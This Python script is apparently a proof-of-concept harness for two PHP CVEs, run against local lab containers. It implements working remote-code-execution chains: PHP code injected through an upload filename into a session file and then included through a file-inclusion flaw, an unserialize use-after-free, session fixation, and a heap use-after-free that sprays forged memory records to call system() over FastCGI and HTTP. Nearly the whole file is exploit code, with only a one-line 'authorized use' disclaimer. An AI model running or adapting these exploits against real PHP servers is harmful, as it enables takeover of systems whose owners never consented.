#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — Comprehensive PoC Test Harness

Tests ALL known public exploit chains against the local lab containers:
  - HTTP lab: php-vuln-http on port 18080 (Apache + mod_php)
  - FCGI lab: php-vuln-fpm on port 19000 (php-fpm)

Chain A: Session file injection (filename → session → LFI → RCE)
Chain B: var_destroy UAF (unserialize reentry, ASAN-only verification)
Chain C: Session Fixation (POST body PHPSESSID bypass)
Chain D: Heap UAF (original repo — stale zval pointers, with corrected delta)

For authorized defensive-research / scoped-engagement use only.
"""
import socket
import struct
import subprocess
import sys
import time
import uuid
from urllib.parse import urlparse

HTTP_TARGET = "http://127.0.0.1:18080"
FCGI_HOST = "127.0.0.1"
FCGI_PORT = 19000

DELTA_82_BOOKWORM = 0xcf40
DTOR_ADDR = 0x566a50
CALL_ADDR = 0x559b10

PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
WARN = "\033[93m[WARN]\033[0m"
INFO = "\033[96m[INFO]\033[0m"

results = []


def http_raw(host, port, method, path, headers, body=b"", timeout=10):
    req = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode() + body)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def http_status(resp):
    if not resp:
        return 0
    try:
        return int(resp.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def http_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return resp


def test_chain_a():
    print(f"\n{'='*70}")
    print(f" CHAIN A: Session File Injection + LFI -> RCE")
    print(f" Source: ikow/php2shell-poc (verify_session_injection.py)")
    print(f"{'='*70}")

    u = urlparse(HTTP_TARGET)
    host, port = u.hostname, u.port
    sid = "chainArce" + uuid.uuid4().hex[:16]  # alphanumeric only
    php_payload = "<?php system(chr(105).chr(100));echo PHP_EOL.chr(82).chr(67).chr(69);?>"
    boundary = "CHAINAVERIFY"

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{php_payload}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    print(f"\n{INFO} Step 1: Injecting PHP code in upload filename...")
    print(f"  SID: {sid}")
    resp = http_raw(host, port, "POST", "/index.php",
                    {"Content-Type": f"multipart/form-data; boundary={boundary}",
                     "Cookie": f"PHPSESSID={sid}"}, body)
    print(f"  HTTP {http_status(resp)}")

    print(f"\n{INFO} Step 2: Checking session file...")
    resp2 = http_raw(host, port, "GET", f"/session_dump.php?sid={sid}", {})
    sess_body = http_body(resp2).decode("latin-1", "replace")
    print(f"  Session: {sess_body[:200]}")
    injection_ok = "<?php" in sess_body
    print(f"  {'Injection OK' if injection_ok else 'Injection FAILED'}")

    print(f"\n{INFO} Step 3: LFI to include session file...")
    resp3 = http_raw(host, port, "GET",
                     f"/vuln_lfi.php?page=/tmp/sessions/sess_{sid}", {})
    lfi_body = http_body(resp3).decode("latin-1", "replace")
    rce_ok = "uid=" in lfi_body and "www-data" in lfi_body
    if rce_ok:
        idx = lfi_body.find("uid=")
        print(f"  {PASS} RCE CONFIRMED! Output: {lfi_body[idx:idx+80]}")
    else:
        print(f"  {FAIL} RCE not triggered. Body: {lfi_body[:200]}")

    results.append(("Chain A: Session Injection + LFI",
                     "PASS-RCE" if rce_ok else ("PARTIAL" if injection_ok else "FAIL")))


def test_chain_b():
    print(f"\n{'='*70}")
    print(f" CHAIN B: var_destroy __destruct Reentry UAF")
    print(f" Source: ikow/php2shell-poc (verify_uaf_asan.php)")
    print(f"{'='*70}")

    php_code = r"""
class TriggerUAF {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired\n");
        $result = @unserialize('R:1500;');
        fwrite(STDERR, "[*] R:1500 type: " . gettype($result) . "\n");
        if ($result !== false) fwrite(STDERR, "[+] UAF_CONFIRMED\n");
    }
}
$N = 2000;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $p .= "i:$i;i:$i;";
$p .= 'i:99999;O:10:"TriggerUAF":0:{}i:99999;i:42;}';
fwrite(STDERR, "[*] Payload: " . strlen($p) . " bytes\n");
@unserialize($p);
fwrite(STDERR, "[*] Done\n");
"""
    print(f"\n{INFO} Running inside container...")
    try:
        r = subprocess.run(["docker", "exec", "php-vuln-http", "php", "-r", php_code],
                           capture_output=True, text=True, timeout=15)
        output = r.stderr + r.stdout
        for line in output.strip().split("\n"):
            print(f"  {line}")
        uaf = "UAF_CONFIRMED" in output
        destruct = "__destruct fired" in output
        if uaf:
            print(f"\n  {PASS} UAF CONFIRMED!")
        elif destruct:
            print(f"\n  {WARN} __destruct fired, R:1500=false (needs ASAN build for full UAF)")
        else:
            print(f"\n  {FAIL} __destruct did NOT fire")
        results.append(("Chain B: var_destroy UAF",
                         "PASS-UAF" if uaf else ("PARTIAL" if destruct else "FAIL")))
    except Exception as e:
        print(f"  {FAIL} Error: {e}")
        results.append(("Chain B: var_destroy UAF", f"ERROR"))


def test_chain_c():
    print(f"\n{'='*70}")
    print(f" CHAIN C: Session Fixation via POST body")
    print(f"{'='*70}")

    u = urlparse(HTTP_TARGET)
    host, port = u.hostname, u.port
    sid = "fixtest" + uuid.uuid4().hex[:20]  # alphanumeric only
    boundary = "FIXTEST"

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    print(f"\n{INFO} Sending upload with POST-body PHPSESSID (no Cookie header)...")
    resp = http_raw(host, port, "POST", "/index.php",
                    {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
    print(f"  HTTP {http_status(resp)}")

    resp2 = http_raw(host, port, "GET", f"/session_dump.php?sid={sid}", {})
    sess = http_body(resp2).decode("latin-1", "replace")
    print(f"  Session: {sess[:200]}")

    ok = "upload_progress" in sess or "test.txt" in sess
    if ok:
        print(f"\n  {PASS} Session fixation CONFIRMED! POST body controls SID!")
    else:
        print(f"\n  {FAIL} Session not created with POST-body SID")
    results.append(("Chain C: Session Fixation", "PASS" if ok else "FAIL"))


FILLUNIT = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
ZEND_INTERNAL = 1
_V, _BEGIN, _PARAMS, _STDIN, _STDOUT, _STDERR, _END = 1, 1, 4, 5, 6, 7, 3


def forge(call_addr, cmd):
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call_addr)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call_addr)
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200:200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def mpart(b, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def fcgi_rec(t, content, rid=1):
    pad = (8 - len(content) % 8) % 8
    return struct.pack("!BBHHBx", _V, t, rid, len(content), pad) + content + b"\x00" * pad


def fcgi_par(pairs):
    out = b""
    for k, v in pairs.items():
        kb, vb = k.encode(), v.encode()
        out += struct.pack("B", len(kb)) + struct.pack("B", len(vb)) + kb + vb
    return out


def _run_fcgi_exploit(bug, label):
    sid = "atlas" + uuid.uuid4().hex[:24]
    cmd = b"id; echo JACKALPOC"
    boundary = b"B7kQpoc" + str(bug).encode()
    spray = forge(CALL_ADDR, cmd)

    if bug == 619:
        pre = mpart(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
        pre += mpart(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        for _ in range(N149):
            pre += mpart(boundary, "t[]", spray) + b"\r\n"
        pre += mpart(boundary, "f", b"", filename="a") + b"\r\n"
        c1 = b"A" * (FILLUNIT + 64)
        phase1 = pre + c1
        c2 = b"B" * (FILLUNIT + 64)
        c3 = b"C" * (FILLUNIT + 64)
        tail = c2 + c3 + b"\r\n--" + boundary + b"--\r\n"
    else:
        pre = mpart(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
        pre += mpart(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        pre += mpart(boundary, "f", b"", filename="a") + b"\r\n"
        c1 = b"A" * (FILLUNIT + 64)
        phase1 = pre + c1
        c2 = b"B" * (FILLUNIT + 64)
        tail = c2 + b"\r\n"
        for _ in range(N149):
            tail += mpart(boundary, "t[]", spray) + b"\r\n"
        tail += mpart(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
        tail += b"--" + boundary + b"--\r\n"

    body = phase1 + tail
    print(f"\n{INFO} {label}")
    print(f"  FCGI {FCGI_HOST}:{FCGI_PORT}  call=0x{CALL_ADDR:x}  body={len(body)}B")

    try:
        s = socket.create_connection((FCGI_HOST, FCGI_PORT), timeout=15)
        s.sendall(fcgi_rec(_BEGIN, struct.pack("!HB5x", 1, 0)))
        params = {
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": "/var/www/html/index.php",
            "SCRIPT_NAME": "/index.php",
            "REQUEST_URI": "/index.php",
            "CONTENT_TYPE": f"multipart/form-data; boundary={boundary.decode()}",
            "CONTENT_LENGTH": str(len(body)),
            "HTTP_COOKIE": f"PHPSESSID={sid}",
            "REMOTE_ADDR": "127.0.0.1",
        }
        s.sendall(fcgi_rec(_PARAMS, fcgi_par(params)))
        s.sendall(fcgi_rec(_PARAMS, b""))
        s.sendall(fcgi_rec(_STDIN, phase1))
        print(f"  Sent phase1, stalling 1.5s...")
        time.sleep(1.5)
        s.sendall(fcgi_rec(_STDIN, tail))
        s.sendall(fcgi_rec(_STDIN, b""))
        s.settimeout(20)
        out = err = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            if len(d) >= 8:
                if d[1] == _STDOUT: out += d[8:]
                elif d[1] == _STDERR: err += d[8:]
                elif d[1] == _END: break
        s.close()
        hit = b"JACKALPOC" in out or b"uid=" in out
        crashed = len(out) == 0 and len(err) == 0
        print(f"  stdout={len(out)}B stderr={len(err)}B")
        if out: print(f"  out: {out[:200]}")
        if err: print(f"  err: {err[:200]}")
        if hit:
            print(f"\n  {PASS} RCE CONFIRMED!")
        elif crashed:
            print(f"\n  {WARN} Worker crash (UAF triggered, heap mismatch)")
        else:
            print(f"\n  {FAIL} No command output")
        return "PASS-RCE" if hit else ("CRASH" if crashed else "FAIL")
    except Exception as e:
        print(f"  {FAIL} Error: {e}")
        return f"ERROR"


def test_chain_d():
    print(f"\n{'='*70}")
    print(f" CHAIN D: Heap UAF (original repo, CORRECTED delta=0x{DELTA_82_BOOKWORM:x})")
    print(f"{'='*70}")
    r619 = _run_fcgi_exploit(619, "Bug 619: stale current_file_bytes_processed")
    results.append(("Chain D-619: Heap UAF (FCGI)", r619))
    r618 = _run_fcgi_exploit(618, "Bug 618: stale post_bytes_processed")
    results.append(("Chain D-618: Heap UAF (FCGI)", r618))


def test_chain_d_http():
    print(f"\n{'='*70}")
    print(f" CHAIN D-HTTP: Heap UAF via HTTP (stall-based)")
    print(f"{'='*70}")

    u = urlparse(HTTP_TARGET)
    host, port = u.hostname, u.port
    sid = "atlas" + uuid.uuid4().hex[:24]
    cmd = b"id; echo JACKALPOC"
    boundary = b"B7kQpoc619"
    spray = forge(CALL_ADDR, cmd)

    pre = mpart(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += mpart(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(N149):
        pre += mpart(boundary, "t[]", spray) + b"\r\n"
    pre += mpart(boundary, "f", b"", filename="a") + b"\r\n"
    c1 = b"A" * (FILLUNIT + 64)
    phase1 = pre + c1
    c2 = b"B" * (FILLUNIT + 64)
    c3 = b"C" * (FILLUNIT + 64)
    tail = c2 + c3 + b"\r\n--" + boundary + b"--\r\n"
    body = phase1 + tail

    print(f"\n{INFO} HTTP {host}:{port}  body={len(body)}B")
    try:
        head = (
            f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((host, port), timeout=30)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.sendall(head + phase1)
        print(f"  Sent phase1, stalling 1.5s...")
        time.sleep(1.5)
        s.sendall(tail)
        s.settimeout(20)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
                if not d: break
                resp += d
            except socket.timeout: break
        s.close()
        rb = http_body(resp)
        hit = b"JACKALPOC" in rb or b"uid=" in rb
        crashed = len(resp) == 0
        print(f"  HTTP {http_status(resp)}  body={len(rb)}B")
        if rb: print(f"  body: {rb[:200]}")
        if hit:
            print(f"\n  {PASS} RCE via HTTP!")
        elif crashed:
            print(f"\n  {WARN} No response (crash)")
        else:
            print(f"\n  {FAIL} No command output")
        results.append(("Chain D-619-HTTP: Heap UAF",
                         "PASS-RCE" if hit else ("CRASH" if crashed else "FAIL")))
    except Exception as e:
        print(f"  {FAIL} Error: {e}")
        results.append(("Chain D-619-HTTP", "ERROR"))


def print_summary():
    print(f"\n{'='*70}")
    print(f" SUMMARY — CVE-2026-109618 / CVE-2026-109619")
    print(f" PHP 8.2.34 Debian Bookworm  |  {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*70}\n")
    for name, status in results:
        if "PASS" in status: icon = PASS
        elif any(x in status for x in ("PARTIAL", "CRASH", "WARN")): icon = WARN
        else: icon = FAIL
        print(f"  {icon} {name}: {status}")
    print()


if __name__ == "__main__":
    print("CVE-2026-109618/109619 — Comprehensive PoC Harness")
    print(f"HTTP={HTTP_TARGET}  FCGI={FCGI_HOST}:{FCGI_PORT}")
    print(f"Delta=0x{DELTA_82_BOOKWORM:x} dtor=0x{DTOR_ADDR:x} call=0x{CALL_ADDR:x}")
    test_chain_a()
    test_chain_b()
    test_chain_c()
    test_chain_d()
    test_chain_d_http()
    print_summary()
